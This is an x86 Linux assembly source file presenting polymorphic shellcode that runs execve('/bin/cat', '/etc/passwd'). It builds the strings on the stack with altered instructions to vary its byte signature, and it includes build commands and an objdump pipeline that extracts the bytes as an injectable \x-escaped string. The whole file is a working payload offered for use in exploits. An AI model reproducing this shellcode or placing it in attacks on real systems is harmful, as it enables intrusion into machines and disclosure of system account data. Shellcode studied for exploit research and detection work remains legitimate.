; Author :  Alessio Parzian
; Filename: shellcode-571-poly-min.asm

; compile with:
; 	nasm -f elf32 shellcode-571-poly-min.asm
;	ld -o shellcode-571-poly shellcode-571-poly-min.o
; extract shellcode with:
; 	objdump -d shellcode-571-poly|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

global _start

section .text

	_start:
		mov al, 0xb	; place the syscall number in the al register
		and eax, 0xF ; apply mask to zeroing everything except the syscall number
		cdq ; zeroing edx register
		push edx ; push on the stack a null address that act as end of string
		mov dword [esp-4], 0x7461632f ; push on the stack tac/
		mov dword [esp-8], 0x6e69622f ; push on the stack nib/
		lea ebx, [esp-8] ; load the address of the string /bin/cat into ebx
		sub esp, 8 ; adjust esp to allow a correct push 
		push edx ; push on the stack a null byte
		mov dword [esp-4], 0x64777373 ; push on the stack dwss
		mov dword [esp-8], 0x61702f2f ; push on the stack ap//
		mov dword [esp-12], 0x6374652f ; push on the stack cte/ 
		sub esp, 12 ; adjust esp to allow a correct push 
		mov ecx, esp ; store the address to /etc/passwd in ecx 
		push edx ; push on the stack a null address that act as a end of array as stated in man 2 execve
		push ecx ; push on the stack the address to /etc/passwd
		push ebx ; push on the stack the address to /bin/cat
		mov ecx, esp ; mov the address that point to the first item of argv in ecx
		int 0x80 ; interrupt for execve syscall